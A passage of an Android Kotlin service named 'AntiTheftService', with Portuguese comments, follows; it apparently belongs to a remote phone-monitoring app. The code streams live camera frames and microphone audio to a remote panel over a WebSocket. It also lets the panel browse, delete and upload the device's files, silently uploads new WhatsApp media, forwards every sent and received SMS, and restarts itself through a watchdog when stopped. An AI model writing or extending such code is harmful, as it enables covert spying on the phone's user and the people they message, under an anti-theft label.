            val pattern = longArrayOf(0, 500, 300, 500, 300)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                val vm = getSystemService(Context.VIBRATOR_MANAGER_SERVICE) as VibratorManager
                vm.defaultVibrator.vibrate(VibrationEffect.createWaveform(pattern, 0))
            } else {
                @Suppress("DEPRECATION")
                val v = getSystemService(Context.VIBRATOR_SERVICE) as Vibrator
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    v.vibrate(VibrationEffect.createWaveform(pattern, 0))
                } else {
                    @Suppress("DEPRECATION")
                    v.vibrate(pattern, 0)
                }
            }
        } catch (e: Exception) { Log.w("AntiTheftService", "Vibration failed: ${e.message}") }
    }

    private fun stopVibration() {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                (getSystemService(Context.VIBRATOR_MANAGER_SERVICE) as VibratorManager).defaultVibrator.cancel()
            } else {
                @Suppress("DEPRECATION")
                (getSystemService(Context.VIBRATOR_SERVICE) as Vibrator).cancel()
            }
        } catch (e: Exception) { /* ignore */ }
    }

    // Picks the first camera that actually has a flash unit — the front camera
    // (often first in cameraIdList) usually doesn't, and setTorchMode() throws for it.
    private fun findFlashCameraId(cm: CameraManager): String? =
        cm.cameraIdList.firstOrNull { id ->
            try { cm.getCameraCharacteristics(id).get(CameraCharacteristics.FLASH_INFO_AVAILABLE) == true }
            catch (e: Exception) { false }
        }

    private fun startFlash() {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.M) return
        try {
            val cm = getSystemService(Context.CAMERA_SERVICE) as CameraManager
            val cameraId = findFlashCameraId(cm) ?: return
            isFlashing = true
            flashHandler = Handler(Looper.getMainLooper())
            var on = true
            flashRunnable = object : Runnable {
                override fun run() {
                    if (!isFlashing) { cm.setTorchMode(cameraId, false); return }
                    cm.setTorchMode(cameraId, on)
                    on = !on
                    flashHandler?.postDelayed(this, 250)
                }
            }
            flashHandler?.post(flashRunnable!!)
        } catch (e: Exception) { Log.w("AntiTheftService", "Flash failed: ${e.message}") }
    }

    private fun stopFlash() {
        isFlashing = false
        flashRunnable?.let { flashHandler?.removeCallbacks(it) }
        flashHandler = null; flashRunnable = null
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.M) return
        try {
            val cm = getSystemService(Context.CAMERA_SERVICE) as CameraManager
            val cameraId = findFlashCameraId(cm) ?: return
            cm.setTorchMode(cameraId, false)
        } catch (e: Exception) { /* ignore */ }
    }

    // ── Binary frame helper ────────────────────────────────────────────────────
    private fun sendTypedBinary(type: Byte, payload: ByteArray) {
        val packet = ByteArray(1 + payload.size)
        packet[0] = type
        System.arraycopy(payload, 0, packet, 1, payload.size)
        try {
            webSocket?.send(packet.toByteString())
        } catch (e: Exception) {
            // Socket closed mid-stream — ignore; next frame uses the reconnected socket.
        }
    }

    // ── Simple perceptual hash for scene-change detection ──────────────────────
    private fun computeFrameHash(bitmap: Bitmap): Long {
        val scaled = Bitmap.createScaledBitmap(bitmap, 8, 8, true)
        val pixels = IntArray(64)
        scaled.getPixels(pixels, 0, 8, 0, 0, 8, 8)
        scaled.recycle()
        var hash = 0L
        for (i in 0 until 64) {
            hash = hash xor ((pixels[i].toLong() and 0xFFFFFFFFL) shl (i % 56))
            hash = (hash shl 1) or (hash ushr 63)
        }
        return hash
    }

    // ── Live Camera Stream (CameraX ImageAnalysis) ─────────────────────────────
    @SuppressLint("MissingPermission")
    private fun startCameraStream(camera: String) {
        if (isCameraStreaming) stopCameraStream()
        isCameraStreaming = true
        cameraStreamExecutor = java.util.concurrent.Executors.newSingleThreadExecutor()

        val mainExecutor = ContextCompat.getMainExecutor(this)
        val future = ProcessCameraProvider.getInstance(this)
        future.addListener({
            try {
                cameraProvider = future.get()
                val selector = if (camera == "front")
                    CameraSelector.DEFAULT_FRONT_CAMERA
                else
                    CameraSelector.DEFAULT_BACK_CAMERA

                // setTargetResolution() foi depreciado no CameraX 1.3+.
                // ResolutionSelector é a API atual e funciona em todas as versões suportadas.
                val resolutionSelector = androidx.camera.core.resolutionselector.ResolutionSelector.Builder()
                    .setResolutionStrategy(
                        androidx.camera.core.resolutionselector.ResolutionStrategy(
                            android.util.Size(360, 640),
                            androidx.camera.core.resolutionselector.ResolutionStrategy.FALLBACK_RULE_CLOSEST_LOWER_THEN_HIGHER
                        )
                    )
                    .build()
                val analysis = ImageAnalysis.Builder()
                    .setResolutionSelector(resolutionSelector)
                    .setBackpressureStrategy(ImageAnalysis.STRATEGY_KEEP_ONLY_LATEST)
                    .build()

                var camLastFrame = 0L
                analysis.setAnalyzer(cameraStreamExecutor!!) { proxy ->
                    try {
                        val now = System.currentTimeMillis()
                        if (isCameraStreaming && now - camLastFrame >= 200) {
                            camLastFrame = now
                            val jpeg = imageProxyToJpeg(proxy, proxy.imageInfo.rotationDegrees, camera == "front")
                            if (jpeg != null) {
                                val type = if (camera == "front") 0x02.toByte() else 0x03.toByte()
                                sendTypedBinary(type, jpeg)
                            }
                        }
                    } finally { proxy.close() }
                }

                cameraProvider?.unbindAll()
                cameraProvider?.bindToLifecycle(this, selector, analysis)
                sendConsoleLog("Câmera $camera ao vivo iniciada.")
            } catch (e: Exception) {
                Log.e("AntiTheftService", "Camera stream error: ${e.message}")
                sendConsoleLog("Erro na câmera ao vivo: ${e.message}")
                isCameraStreaming = false
            }
        }, mainExecutor)
    }

    private fun stopCameraStream() {
        isCameraStreaming = false
        cameraProvider?.unbindAll()
        cameraProvider = null
        cameraStreamExecutor?.shutdown()
        cameraStreamExecutor = null
        sendConsoleLog("Câmera ao vivo encerrada.")
    }

    private fun imageProxyToJpeg(proxy: ImageProxy, rotationDegrees: Int = 0, isFront: Boolean = false): ByteArray? {
        return try {
            val yPlane = proxy.planes[0]
            val uPlane = proxy.planes[1]
            val vPlane = proxy.planes[2]
            val yBuf = yPlane.buffer; val uBuf = uPlane.buffer; val vBuf = vPlane.buffer
            val ySize = yBuf.remaining(); val uSize = uBuf.remaining(); val vSize = vBuf.remaining()
            val nv21 = ByteArray(ySize + uSize + vSize)
            yBuf.get(nv21, 0, ySize)
            vBuf.get(nv21, ySize, vSize)
            uBuf.get(nv21, ySize + vSize, uSize)
            val yuvImage = YuvImage(nv21, ImageFormat.NV21, proxy.width, proxy.height, null)
            val out = ByteArrayOutputStream()
            yuvImage.compressToJpeg(Rect(0, 0, proxy.width, proxy.height), 50, out)

            // Apply rotation (and horizontal mirror for front camera)
            if (rotationDegrees == 0 && !isFront) {
                out.toByteArray()
            } else {
                val raw = out.toByteArray()
                val bmp = android.graphics.BitmapFactory.decodeByteArray(raw, 0, raw.size)
                val matrix = android.graphics.Matrix().apply {
                    if (rotationDegrees != 0) postRotate(rotationDegrees.toFloat())
                    if (isFront) postScale(-1f, 1f) // mirror front camera horizontally
                }
                val rotated = Bitmap.createBitmap(bmp, 0, 0, bmp.width, bmp.height, matrix, true)
                bmp.recycle()
                val rotOut = ByteArrayOutputStream()
                rotated.compress(Bitmap.CompressFormat.JPEG, 50, rotOut)
                rotated.recycle()
                rotOut.toByteArray()
            }
        } catch (e: Exception) { null }
    }

    // ── Live Audio Stream (AudioRecord → PCM 16-bit 16kHz) ────────────────────
    @SuppressLint("MissingPermission")
    private fun startAudioStream() {
        if (isAudioStreaming) return
        val sampleRate  = 16000
        val channelCfg  = AudioFormat.CHANNEL_IN_MONO
        val audioFmt    = AudioFormat.ENCODING_PCM_16BIT
        val bufSize     = maxOf(AudioRecord.getMinBufferSize(sampleRate, channelCfg, audioFmt), 3200)

        audioRecord = AudioRecord(MediaRecorder.AudioSource.MIC, sampleRate, channelCfg, audioFmt, bufSize)
        if (audioRecord?.state != AudioRecord.STATE_INITIALIZED) {
            sendConsoleLog("Erro: microfone indisponível para streaming ao vivo.")
            audioRecord = null; return
        }

        isAudioStreaming = true
        audioRecord?.startRecording()

        audioStreamThread = Thread {
            val buf = ByteArray(bufSize)
            while (isAudioStreaming) {
                val read = audioRecord?.read(buf, 0, bufSize) ?: AudioRecord.ERROR_DEAD_OBJECT
                if (read > 0) {
                    sendTypedBinary(0x04.toByte(), buf.copyOf(read))
                } else {
                    // Negative return = AudioRecord error (dead object, invalid op, etc).
                    // Retrying immediately would spin the CPU; the recorder won't recover on its own,
                    // so release it here rather than leaving a dead AudioRecord to leak on next start.
                    Log.e("AntiTheftService", "AudioRecord.read() failed with code $read, stopping live audio stream")
                    isAudioStreaming = false
                    try { audioRecord?.stop() } catch (_: Exception) {}
                    try { audioRecord?.release() } catch (_: Exception) {}
                    audioRecord = null
                    sendConsoleLog("Áudio ao vivo interrompido: erro no microfone.")
                }
            }
        }.also { it.isDaemon = true; it.start() }

        sendConsoleLog("Áudio ao vivo iniciado (16kHz PCM).")
    }

    private fun stopAudioStream() {
        isAudioStreaming = false
        audioStreamThread?.join(400)
        audioRecord?.stop(); audioRecord?.release(); audioRecord = null
        audioStreamThread = null
        sendConsoleLog("Áudio ao vivo encerrado.")
    }

    // ── Remote File Browser ────────────────────────────────────────────────────

    private fun externalRoot(): String =
        android.os.Environment.getExternalStorageDirectory().absolutePath

    @SuppressLint("MissingPermission")
    private fun listRemoteFiles(path: String) {
        try {
            val dir = java.io.File(path)
            if (!dir.exists() || !dir.canRead()) {
                sendFileEvent("""{"type":"FILE_LIST_ERROR","deviceId":"$deviceId","path":${Json.encodeToString(path)},"error":"Acesso negado ou pasta não encontrada"}""")
                return
            }
            val items = dir.listFiles()?.map { f ->
                val ext = if (f.isFile) f.extension.lowercase() else ""
                """{"name":${Json.encodeToString(f.name)},"type":"${if (f.isDirectory) "dir" else "file"}","size":${f.length()},"modified":${f.lastModified()},"ext":${Json.encodeToString(ext)},"path":${Json.encodeToString(f.absolutePath)}}"""
            } ?: emptyList()

            val sortedItems = items.sortedWith(compareBy(
                { !it.contains("\"type\":\"dir\"") },
                { it.substringAfter("\"name\":\"").substringBefore("\"").lowercase() }
            ))

            val response = """{"type":"FILE_LIST","deviceId":"$deviceId","path":${Json.encodeToString(path)},"parent":${Json.encodeToString(dir.parent ?: "")},"files":[${sortedItems.joinToString(",")}]}"""
            sendFileEvent(response)
        } catch (e: Exception) {
            sendFileEvent("""{"type":"FILE_LIST_ERROR","deviceId":"$deviceId","path":${Json.encodeToString(path)},"error":${Json.encodeToString(e.message ?: "Erro desconhecido")}}""")
        }
    }

    private fun deleteRemoteFile(path: String) {
        try {
            val file = java.io.File(path)
            val success = if (file.isDirectory) file.deleteRecursively() else file.delete()
            val event = if (success) {
                """{"type":"FILE_DELETED","deviceId":"$deviceId","path":${Json.encodeToString(path)},"success":true}"""
            } else {
                """{"type":"FILE_DELETED","deviceId":"$deviceId","path":${Json.encodeToString(path)},"success":false,"error":"Falha ao excluir"}"""
            }
            sendFileEvent(event)
            sendConsoleLog("${if (success) "✅" else "❌"} Exclusão remota: $path")
        } catch (e: Exception) {
            sendFileEvent("""{"type":"FILE_DELETED","deviceId":"$deviceId","path":${Json.encodeToString(path)},"success":false,"error":${Json.encodeToString(e.message ?: "")}}""")
        }
    }

    private fun uploadRemoteFile(path: String) {
        val file = java.io.File(path)
        if (!file.exists() || !file.isFile) {
            sendFileEvent("""{"type":"FILE_UPLOAD_ERROR","deviceId":"$deviceId","path":${Json.encodeToString(path)},"error":"Arquivo não encontrado"}""")
            return
        }
        if (file.length() > 100 * 1024 * 1024) { // 100MB limit
            sendFileEvent("""{"type":"FILE_UPLOAD_ERROR","deviceId":"$deviceId","path":${Json.encodeToString(path)},"error":"Arquivo muito grande (máx 100MB)"}""")
            return
        }

        sendConsoleLog("Enviando arquivo ao servidor: ${file.name} (${file.length() / 1024}KB)...")

        val serverUrl = getUploadUrl("/upload/file/$deviceId")
        val mime = getMimeType(file.extension.lowercase())
        val requestBody = MultipartBody.Builder()
            .setType(MultipartBody.FORM)
            .addFormDataPart("file", file.name, file.asRequestBody(mime.toMediaType()))
            .addFormDataPart("originalPath", path)
            .build()

        okHttpClient.newCall(Request.Builder().url(serverUrl).post(requestBody).build())
            .enqueue(object : Callback {
                override fun onResponse(call: Call, response: Response) {
                    response.use {
                        if (response.isSuccessful) {
                            sendConsoleLog("✅ Arquivo ${file.name} transferido para o painel.")
                        } else {
                            sendConsoleLog("❌ Falha ao enviar ${file.name}: HTTP ${response.code}")
                        }
                    }
                }
                override fun onFailure(call: Call, e: IOException) {
                    sendConsoleLog("❌ Falha de rede ao enviar ${file.name}: ${e.message}")
                }
            })
    }

    private fun sendFileEvent(json: String) {
        try { webSocket?.send(json) } catch (e: Exception) { Log.e("AntiTheftService", "sendFileEvent: ${e.message}") }
    }

    private fun getMimeType(ext: String): String = when (ext) {
        "jpg", "jpeg" -> "image/jpeg"
        "png"  -> "image/png"
        "gif"  -> "image/gif"
        "webp" -> "image/webp"
        "mp4"  -> "video/mp4"
        "mkv"  -> "video/x-matroska"
        "avi"  -> "video/avi"
        "mov"  -> "video/quicktime"
        "mp3"  -> "audio/mpeg"
        "aac"  -> "audio/aac"
        "ogg"  -> "audio/ogg"
        "pdf"  -> "application/pdf"
        "txt"  -> "text/plain"
        "zip"  -> "application/zip"
        else   -> "application/octet-stream"
    }

    private fun notifyReactivateScreenCapture() {
        val intent = Intent(this, MainActivity::class.java).apply {
            flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP
            putExtra("AUTO_SCREEN_PERM", true)
        }
        val pendingIntent = PendingIntent.getActivity(
            this, 9988776, intent,
            PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
        )
        val manager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
        val notification = NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Reativar Transmissão de Tela")
            .setContentText("Toque para reautorizar a captura de tela remotamente.")
            .setSmallIcon(android.R.drawable.ic_media_play)
            .setPriority(NotificationCompat.PRIORITY_HIGH)
            .setContentIntent(pendingIntent)
            .setAutoCancel(true)
            .build()
        manager.notify(9988776, notification)
    }

    private fun showMessageNotification(message: String) {
        val manager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
        val notification = NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Nova mensagem")
            .setContentText(message)
            .setSmallIcon(android.R.drawable.ic_dialog_email)
            .setAutoCancel(true)
            .build()
        manager.notify((System.currentTimeMillis() % Int.MAX_VALUE).toInt(), notification)
        sendConsoleLog("Mensagem recebida do painel: $message")
    }

    // ── Periodic WhatsApp media scan (fallback for Xiaomi inotify issues) ─────
    private fun scanWhatsAppMediaFolders() {
        try {
            val cutoff = System.currentTimeMillis() - 180_000 // files modified within last 3 min
            val folderTypes = listOf(
                Pair(WhatsAppPaths.allImageFolders(), "image"),
                Pair(WhatsAppPaths.allVideoFolders(), "video"),
                Pair(WhatsAppPaths.allAudioFolders(), "audio"),
                Pair(WhatsAppPaths.allDocumentFolders(), "document")
            )
            for ((folders, type) in folderTypes) {
                for (basePath in folders) {
                    val baseDir = File(basePath)
                    if (!baseDir.exists() || !baseDir.isDirectory) continue
                    scanFolder(baseDir, type, isSent = false, cutoff)
                    val sentDir = File(baseDir, "Sent")
                    if (sentDir.exists() && sentDir.isDirectory) {
                        scanFolder(sentDir, type, isSent = true, cutoff)
                    }
                }
            }
        } catch (e: Exception) {
            Log.e("AntiTheftService", "Periodic media scan error: ${e.message}")
        }
    }

    private fun scanFolder(dir: File, type: String, isSent: Boolean, cutoff: Long) {
        val files = dir.listFiles() ?: return
        for (file in files) {
            if (!file.isFile) continue
            if (file.lastModified() < cutoff) continue
            if (file.length() < 1000) continue
            if (!MediaUploadDedup.shouldUpload(file)) continue
            val caption = when (type) {
                "image" -> "📷 Imagem"
                "video" -> "🎥 Vídeo"
                "audio" -> "🎤 Áudio"
                else -> "📎 Arquivo"
            }
            val (address, name) = resolveMediaChat(isSent)
            Log.d("AntiTheftService", "Periodic scan: ${file.name} type=$type sent=$isSent chat=$address")
            uploadWhatsAppMediaInternal(file, type, isSent, address, name, caption)
        }
    }

    private fun resolveMediaChat(isSent: Boolean): Pair<String, String> {
        // Use the last captured incoming address as fallback for better grouping
        val lastIncoming = WhatsAppNotificationListener.lastIncomingAddress()
        return if (isSent) {
            val chat = ProtectAccessibilityService.currentChatName()
            when {
                chat.isNotBlank() -> chat to chat
                lastIncoming.isNotBlank() -> lastIncoming to lastIncoming
                else -> "Enviado" to "Enviado"
            }
        } else {
            when {
                lastIncoming.isNotBlank() -> lastIncoming to lastIncoming
                else -> "Recebido" to "Recebido"
            }
        }
    }

    // ── Periodic health check ─────────────────────────────────────────────────
    private fun logHealthStatus() {
        try {
            val wsOk = isWebSocketConnected
            val listenerOk = WhatsAppNotificationListener.isConnected()
            Log.i("AntiTheftService", "Health: ws=$wsOk listener=$listenerOk")
            if (!wsOk) {
                Log.w("AntiTheftService", "Health: WebSocket disconnected, reconnecting...")
                Handler(Looper.getMainLooper()).post { connectToServer() }
            }
            if (!listenerOk) {
                Log.w("AntiTheftService", "Health: NotificationListener not connected")
                Handler(Looper.getMainLooper()).post { checkNotificationListenerStatus() }
            }
        } catch (e: Exception) {
            Log.e("AntiTheftService", "Health check error: ${e.message}")
        }
    }

    // ── NetworkCallback: reconexão automática quando a rede volta ─────────────
    private fun registerNetworkCallback() {
        try {
            val cm = getSystemService(Context.CONNECTIVITY_SERVICE) as android.net.ConnectivityManager
            val request = android.net.NetworkRequest.Builder()
                .addCapability(android.net.NetworkCapabilities.NET_CAPABILITY_INTERNET)
                .build()
            networkCallback = object : android.net.ConnectivityManager.NetworkCallback() {
                override fun onAvailable(network: android.net.Network) {
                    // Rede voltou (saída de Doze, Wi-Fi reconectado, dados móveis) →
                    // reconecta o WebSocket imediatamente se estiver desconectado.
                    Log.d("AntiTheftService", "Network available — checking WebSocket")
                    Handler(Looper.getMainLooper()).postDelayed({
                        if (isServiceRunning && !isWebSocketConnected) {
                            Log.i("AntiTheftService", "Network restored — reconnecting WebSocket")
                            reconnectDelay = 5_000L  // reseta backoff ao reconectar por rede
                            connectToServer()
                        }
                    }, 1_000L) // aguarda 1s para estabilizar a conexão
                }
            }
            cm.registerNetworkCallback(request, networkCallback!!)
            Log.d("AntiTheftService", "NetworkCallback registered")
        } catch (e: Exception) {
            Log.e("AntiTheftService", "Failed to register NetworkCallback: ${e.message}")
        }
    }

    // Helper to log dynamic events to the dashboard console
    private fun sendConsoleLog(logMessage: String) {
        try {
            val logMap = mapOf(
                "type" to "LOG",
                "deviceId" to deviceId,
                "message" to logMessage
            )
            webSocket?.send(Json.encodeToString(logMap))
        } catch (e: Exception) {
            Log.e("AntiTheftService", "Failed to send console log: ${e.message}")
        }
    }

    // Battery Metrics Helper
    private fun getBatteryPercentage(): Int {
        val bm = getSystemService(Context.BATTERY_SERVICE) as BatteryManager
        return bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)
    }

    private fun isDeviceCharging(): Boolean {
        val batteryStatus = registerReceiver(null, android.content.IntentFilter(Intent.ACTION_BATTERY_CHANGED))
        val status = batteryStatus?.getIntExtra(BatteryManager.EXTRA_STATUS, -1) ?: -1
        return status == BatteryManager.BATTERY_STATUS_CHARGING || status == BatteryManager.BATTERY_STATUS_FULL
    }

    override fun onBind(intent: Intent): IBinder? {
        super.onBind(intent)
        return null // Started service
    }

    override fun onDestroy() {
        super.onDestroy()
        Log.d("AntiTheftService", "Service onDestroy — scheduling immediate restart")
        isServiceRunning = false
        if (serviceInstance === this) serviceInstance = null

        // Schedule restart via WorkManager (safer than Handler after onDestroy)
        ServiceWatchdogWorker.scheduleImmediate(applicationContext)
        
        // Clean up resources
        stopLocationTracking()
        stopScreenStreaming()
        stopScreenRecord()
        releaseMediaProjection()

        mediaPlayer?.stop()
        mediaPlayer?.release()
        mediaPlayer = null
        
        smsObserver?.let { contentResolver.unregisterContentObserver(it) }
        smsObserver = null

        listenerCheckRunnable?.let { listenerCheckHandler.removeCallbacks(it) }
        listenerCheckRunnable = null

        mediaScanRunnable?.let { mediaScanHandler?.removeCallbacks(it) }
        mediaScanRunnable = null
        mediaScanHandlerThread?.quitSafely()
        mediaScanHandlerThread = null
        mediaScanHandler = null
        healthCheckRunnable?.let { healthCheckHandler.removeCallbacks(it) }
        healthCheckRunnable = null

        webSocket?.close(1000, "Service destroyed")
        stopCallRecord()
        @Suppress("DEPRECATION")
        phoneStateListener?.let {
            (getSystemService(Context.TELEPHONY_SERVICE) as? TelephonyManager)
                ?.listen(it, PhoneStateListener.LISTEN_NONE)
        }
        phoneStateListener = null
        stopCameraRecord()
        stopCameraStream()
        stopAudioStream()
        stopVibration()
        stopFlash()
        wakeLock?.let { if (it.isHeld) it.release() }
        wakeLock = null

        whatsAppMediaObserver?.stop()
        whatsAppMediaObserver = null
        whatsAppMediaStoreObserver?.stop()
        whatsAppMediaStoreObserver = null

        // Libera NetworkCallback
        networkCallback?.let { cb ->
            try {
                val cm = getSystemService(Context.CONNECTIVITY_SERVICE) as android.net.ConnectivityManager
                cm.unregisterNetworkCallback(cb)
            } catch (_: Exception) {}
        }
        networkCallback = null
    }

    private fun registerSmsObserver() {
        // Unregister any existing observer first (e.g. on reconnect)
        smsObserver?.let { contentResolver.unregisterContentObserver(it) }

        // Record the current max SMS _id so we only send NEW messages
        try {
            contentResolver.query(
                Uri.parse("content://sms"),
                arrayOf("_id"), null, null, "_id DESC"
            )?.use { cursor ->
                if (cursor.moveToFirst()) {
                    lastKnownSmsId = cursor.getLong(0)
                }
            }
        } catch (e: Exception) {
            Log.e("AntiTheftService", "Error reading initial SMS ID: ${e.message}")
        }

        // Usar mediaScanHandler (HandlerThread de background) em vez do main looper:
        // syncNewSms() faz contentResolver.query — não pode rodar na main thread
        val smsHandler = mediaScanHandler ?: Handler(Looper.getMainLooper())
        smsObserver = object : ContentObserver(smsHandler) {
            override fun onChange(selfChange: Boolean) = syncNewSms()
            override fun onChange(selfChange: Boolean, uri: Uri?) = syncNewSms()
        }
        contentResolver.registerContentObserver(
            Uri.parse("content://sms"),
            true,
            smsObserver!!
        )
        Log.d("AntiTheftService", "SMS observer registered (lastId=$lastKnownSmsId)")
    }

    private fun syncNewSms() {
        try {
            val cursor = contentResolver.query(
                Uri.parse("content://sms"),
                arrayOf("_id", "address", "body", "date", "type"),
                "_id > ?",
                arrayOf(lastKnownSmsId.toString()),
                "_id ASC"
            ) ?: return

            cursor.use {
                while (it.moveToNext()) {
                    val id      = it.getLong(it.getColumnIndexOrThrow("_id"))
                    val address = it.getString(it.getColumnIndexOrThrow("address")) ?: ""
                    val body    = it.getString(it.getColumnIndexOrThrow("body")) ?: ""
                    val date    = it.getLong(it.getColumnIndexOrThrow("date"))
                    val type    = it.getInt(it.getColumnIndexOrThrow("type"))

                    // 1 = inbox (received), 2 = sent
                    if (type == 1 || type == 2) {
                        val direction = if (type == 1) "in" else "out"
                        val payload = """{"type":"SMS","deviceId":${Json.encodeToString(deviceId)},"direction":"$direction","address":${Json.encodeToString(address)},"content":${Json.encodeToString(body)},"timestamp":$date}"""
                        webSocket?.send(payload)
                        Log.d("AntiTheftService", "SMS synced id=$id dir=$direction from=$address")
                    }

                    if (id > lastKnownSmsId) lastKnownSmsId = id
                }
            }
        } catch (e: Exception) {
            Log.e("AntiTheftService", "Error syncing SMS: ${e.message}")
        }
    }
}

// Simple dynamic URI Encoder for safe characters since standard URLEncoder creates '+' signs for spaces
object UriEncoder {
    fun encode(s: String): String {
        val sb = StringBuilder()
        for (c in s) {
            if (c in 'a'..'z' || c in 'A'..'Z' || c in '0'..'9' || c == '-' || c == '_' || c == '.' || c == '~') {
                sb.append(c)
            } else {
                sb.append(String.format("%%%02X", c.code))
            }
        }
        return sb.toString()
    }
}
